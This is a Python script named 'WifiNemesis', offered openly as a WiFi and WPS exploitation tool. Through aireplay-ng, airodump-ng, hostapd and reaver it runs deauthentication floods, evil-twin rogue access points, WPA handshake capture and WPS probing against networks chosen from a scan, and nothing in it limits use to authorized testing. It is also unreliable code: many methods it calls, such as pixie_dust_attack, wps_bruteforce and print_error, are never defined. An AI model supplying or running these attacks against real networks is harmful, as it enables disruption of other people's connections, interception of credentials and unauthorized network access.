#!/usr/bin/env python3

import os
import sys
import time
import json
import logging
import argparse
import threading
import subprocess
import hashlib
import re
from datetime import datetime
from typing import List, Dict, Optional, Tuple, Set
from colorama import init, Fore, Back, Style

# Initialize colorama for cross-platform color support
init()

# Configure logging with timestamp
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('wifi_nemesis.log'),
        logging.StreamHandler()
    ]
)

class NetworkInterface:
    """Network interface management"""
    def __init__(self):
        self.interfaces = self.get_wireless_interfaces()
        self.current_interface = None
        
    def get_wireless_interfaces(self) -> List[str]:
        """Get list of available wireless interfaces"""
        try:
            result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
            interfaces = re.findall(r'Interface\s+(\w+)', result.stdout)
            return interfaces
        except Exception as e:
            logging.error(f"Failed to get wireless interfaces: {e}")
            return []
            
    def set_monitor_mode(self, interface: str) -> bool:
        """Enable monitor mode on interface"""
        try:
            subprocess.run(['ip', 'link', 'set', interface, 'down'], check=True)
            subprocess.run(['iw', interface, 'set', 'monitor', 'none'], check=True)
            subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True)
            return True
        except subprocess.CalledProcessError as e:
            logging.error(f"Failed to set monitor mode: {e}")
            return False

class AdvancedAttacks:
    """Enhanced attack capabilities"""
    def __init__(self, interface: str):
        self.interface = interface
        self.stop_attack = False
        
    def deauth_attack(self, target_bssid: str, client_mac: Optional[str] = None):
        """Perform deauthentication attack"""
        try:
            while not self.stop_attack:
                if client_mac:
                    # Targeted deauth
                    subprocess.run([
                        'aireplay-ng',
                        '--deauth', '1',
                        '-a', target_bssid,
                        '-c', client_mac,
                        self.interface
                    ])
                else:
                    # Broadcast deauth
                    subprocess.run([
                        'aireplay-ng',
                        '--deauth', '1',
                        '-a', target_bssid,
                        self.interface
                    ])
                time.sleep(0.5)
        except Exception as e:
            logging.error(f"Deauth attack failed: {e}")

    def evil_twin(self, target_ssid: str, target_bssid: str, channel: int):
        """Create rogue access point"""
        try:
            # Create virtual interface
            subprocess.run(['iw', 'dev', self.interface, 'interface', 'add', 'fake_ap', 'type', 'monitor'])
            
            # Configure hostapd
            hostapd_conf = f"""
interface=fake_ap
driver=nl80211
ssid={target_ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
            with open('hostapd.conf', 'w') as f:
                f.write(hostapd_conf)
                
            # Start the fake AP
            subprocess.Popen(['hostapd', 'hostapd.conf'])
            
        except Exception as e:
            logging.error(f"Evil twin attack failed: {e}")

    def handshake_capture(self, target_bssid: str, channel: int):
        """Capture WPA handshakes"""
        try:
            output_file = f"handshake_{target_bssid.replace(':', '')}_{int(time.time())}"
            
            # Start airodump-ng for handshake capture
            capture_proc = subprocess.Popen([
                'airodump-ng',
                '--bssid', target_bssid,
                '--channel', str(channel),
                '--write', output_file,
                self.interface
            ])
            
            # Start deauth attack to force handshake
            self.deauth_attack(target_bssid)
            
            time.sleep(30)  # Capture for 30 seconds
            capture_proc.terminate()
            
            return output_file
            
        except Exception as e:
            logging.error(f"Handshake capture failed: {e}")
            return None

class NetworkAnalyzer:
    """Advanced network analysis capabilities"""
    def __init__(self, interface: str):
        self.interface = interface
        self.networks = {}
        self.clients = set()
        
    def scan_networks(self) -> Dict:
        """Enhanced network scanner with vulnerability detection"""
        try:
            result = subprocess.run([
                'airodump-ng',
                '--output-format', 'csv',
                '--write', 'scan',
                self.interface
            ], timeout=30)
            
            # Parse results
            with open('scan-01.csv', 'r') as f:
                for line in f:
                    if re.match(r'^([A-F0-9]{2}:){5}[A-F0-9]{2}', line):
                        bssid, channel, *rest = line.split(',')
                        self.networks[bssid] = {
                            'channel': channel,
                            'encryption': rest[5],
                            'power': rest[8],
                            'wps': self.check_wps(bssid)
                        }
            
            return self.networks
            
        except Exception as e:
            logging.error(f"Network scan failed: {e}")
            return {}
            
    def check_wps(self, bssid: str) -> bool:
        """Check if WPS is enabled and vulnerable"""
        try:
            result = subprocess.run([
                'reaver',
                '--bssid', bssid,
                '--interface', self.interface,
                '--check'
            ], capture_output=True, text=True)
            
            return "WPS PIN" in result.stdout
            
        except Exception:
            return False
            
    def monitor_clients(self, target_bssid: str):
        """Monitor connected clients"""
        try:
            while True:
                result = subprocess.run([
                    'airodump-ng',
                    '--bssid', target_bssid,
                    '--output-format', 'csv',
                    '--write', 'clients',
                    self.interface
                ], timeout=10)
                
                # Parse client data
                with open('clients-01.csv', 'r') as f:
                    for line in f:
                        if re.match(r'^([A-F0-9]{2}:){5}[A-F0-9]{2}', line):
                            client_mac = line.split(',')[0]
                            self.clients.add(client_mac)
                            
                time.sleep(5)
                
        except Exception as e:
            logging.error(f"Client monitoring failed: {e}")

class WifiNemesis:
    def __init__(self):
        self.version = "3.0.0"
        self.vulnerable_devices = self.load_vulnerable_devices()
        self.interface = NetworkInterface()
        self.analyzer = None
        self.advanced = None
        self.target_bssid = None
        self.target_pin = None
        self.log_file = None
        self.attack_threads = []
        self.stop_attack = False
        
    def print_banner(self):
        banner = f"""
{Fore.GREEN}
██╗    ██╗██╗███████╗██╗    ███╗   ██╗███████╗███╗   ███╗███████╗███████╗██╗███████╗
██║    ██║██║██╔════╝██║    ████╗  ██║██╔════╝████╗ ████║██╔════╝██╔════╝██║██╔════╝
██║ █╗ ██║██║█████╗  ██║    ██╔██╗ ██║█████╗  ██╔████╔██║█████╗  ███████╗██║███████╗
██║███╗██║██║██╔══╝  ██║    ██║╚██╗██║██╔══╝  ██║╚██╔╝██║██╔══╝  ╚════██║██║╚════██║
╚███╔███╔╝██║██║     ██║    ██║ ╚████║███████╗██║ ╚═╝ ██║███████╗███████║██║███████║
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚═╝  ╚═══╝╚══════╝╚═╝     ╚═╝╚══════╝╚══════╝╚═╝╚══════╝
                                                                        Version: {self.version}
{Fore.CYAN}The Ultimate WPS Exploitation Tool for Android{Style.RESET_ALL}
"""
        self.print_with_effect(banner)

    def print_with_effect(self, text: str, delay: float = 0.001):
        """Print text with a typing effect"""
        for char in text:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(delay)
        print()

    def setup_interface(self) -> bool:
        """Setup wireless interface"""
        interfaces = self.interface.get_wireless_interfaces()
        if not interfaces:
            self.print_error("No wireless interfaces found")
            return False
            
        # Use first available interface
        self.interface.current_interface = interfaces[0]
        if not self.interface.set_monitor_mode(self.interface.current_interface):
            return False
            
        self.analyzer = NetworkAnalyzer(self.interface.current_interface)
        self.advanced = AdvancedAttacks(self.interface.current_interface)
        return True

    def start_attack(self, target_bssid: str, attack_type: str):
        """Enhanced attack launcher"""
        if attack_type not in ["pixie", "bruteforce", "deauth", "evil_twin", "handshake"]:
            self.print_error("Invalid attack type")
            return

        self.target_bssid = target_bssid
        self.stop_attack = False

        if attack_type == "deauth":
            attack_thread = threading.Thread(
                target=self.advanced.deauth_attack,
                args=(target_bssid,)
            )
        elif attack_type == "evil_twin":
            network_info = self.analyzer.networks.get(target_bssid, {})
            if not network_info:
                self.print_error("Network information not found")
                return
                
            attack_thread = threading.Thread(
                target=self.advanced.evil_twin,
                args=(network_info.get('ssid'), target_bssid, int(network_info.get('channel', 1)))
            )
        elif attack_type == "handshake":
            attack_thread = threading.Thread(
                target=self.advanced.handshake_capture,
                args=(target_bssid, int(self.analyzer.networks.get(target_bssid, {}).get('channel', 1)))
            )
        else:
            # Original WPS attacks
            attack_thread = threading.Thread(
                target=self.pixie_dust_attack if attack_type == "pixie" else self.wps_bruteforce,
                args=(target_bssid,)
            )

        self.attack_threads.append(attack_thread)
        attack_thread.start()

        try:
            while attack_thread.is_alive():
                self.show_attack_progress()
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.stop_attack = True
            self.print_info("Stopping attack...")
            attack_thread.join()

    def main_menu(self):
        """Enhanced interactive main menu"""
        while True:
            self.clear_screen()
            self.print_banner()
            
            print(f"\n{Fore.CYAN}=== Main Menu ==={Style.RESET_ALL}")
            print(f"{Fore.GREEN}1.{Style.RESET_ALL} Network Scanner")
            print(f"{Fore.GREEN}2.{Style.RESET_ALL} Pixie Dust Attack")
            print(f"{Fore.GREEN}3.{Style.RESET_ALL} WPS Bruteforce")
            print(f"{Fore.GREEN}4.{Style.RESET_ALL} Deauth Attack")
            print(f"{Fore.GREEN}5.{Style.RESET_ALL} Evil Twin Attack")
            print(f"{Fore.GREEN}6.{Style.RESET_ALL} Handshake Capture")
            print(f"{Fore.GREEN}7.{Style.RESET_ALL} View Vulnerable Devices")
            print(f"{Fore.GREEN}8.{Style.RESET_ALL} Settings")
            print(f"{Fore.GREEN}9.{Style.RESET_ALL} Exit")

            choice = input(f"\n{Fore.GREEN}Choose an option (1-9): {Style.RESET_ALL}")

            if choice == '1':
                self.handle_network_scan()
            elif choice == '2':
                self.handle_pixie_dust()
            elif choice == '3':
                self.handle_bruteforce()
            elif choice == '4':
                self.handle_deauth()
            elif choice == '5':
                self.handle_evil_twin()
            elif choice == '6':
                self.handle_handshake()
            elif choice == '7':
                self.show_vulnerable_devices()
            elif choice == '8':
                self.show_settings()
            elif choice == '9':
                self.cleanup_and_exit()
            else:
                self.print_error("Invalid choice")
                time.sleep(1)

    def handle_network_scan(self):
        """Enhanced network scanning"""
        self.print_info("Scanning for networks...")
        networks = self.analyzer.scan_networks()
        
        if not networks:
            self.print_error("No networks found")
            return
            
        print("\nDetected Networks:")
        print(f"{'BSSID':<18} {'Channel':<8} {'Power':<6} {'WPS':<4} {'Encryption'}")
        print("-" * 50)
        
        for bssid, info in networks.items():
            wps_status = "Yes" if info['wps'] else "No"
            print(f"{bssid:<18} {info['channel']:<8} {info['power']:<6} {wps_status:<4} {info['encryption']}")
            
        input("\nPress Enter to continue...")

    def handle_deauth(self):
        """Handle deauthentication attack"""
        if not self.analyzer.networks:
            self.print_error("Please scan for networks first")
            return
            
        bssid = input("Enter target BSSID: ")
        if bssid not in self.analyzer.networks:
            self.print_error("Invalid BSSID")
            return
            
        client = input("Enter client MAC (leave empty for broadcast): ").strip()
        self.start_attack(bssid, "deauth")

    def handle_evil_twin(self):
        """Handle evil twin attack"""
        if not self.analyzer.networks:
            self.print_error("Please scan for networks first")
            return
            
        bssid = input("Enter target BSSID: ")
        if bssid not in self.analyzer.networks:
            self.print_error("Invalid BSSID")
            return
            
        self.start_attack(bssid, "evil_twin")

    def handle_handshake(self):
        """Handle handshake capture"""
        if not self.analyzer.networks:
            self.print_error("Please scan for networks first")
            return
            
        bssid = input("Enter target BSSID: ")
        if bssid not in self.analyzer.networks:
            self.print_error("Invalid BSSID")
            return
            
        self.start_attack(bssid, "handshake")

def main():
    tool = WifiNemesis()
    
    if not tool.setup_interface():
        sys.exit(1)

    tool.main_menu()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Operation cancelled by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        sys.exit(1)
